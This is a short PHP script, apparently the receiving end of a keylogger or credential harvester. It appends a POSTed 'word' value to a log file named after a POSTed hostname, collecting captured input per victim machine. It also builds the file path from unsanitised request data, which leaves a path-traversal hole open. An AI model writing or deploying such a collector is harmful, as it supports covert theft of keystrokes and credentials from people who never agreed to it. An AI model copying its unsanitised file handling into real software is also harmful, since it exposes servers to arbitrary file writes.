<?php

$key = $_POST['word'];
$filename = 'logs/' . $_POST['hostname'] . '.txt';

$file = fopen($filename, 'a');
fwrite($file, $key);
fclose($file);

?>
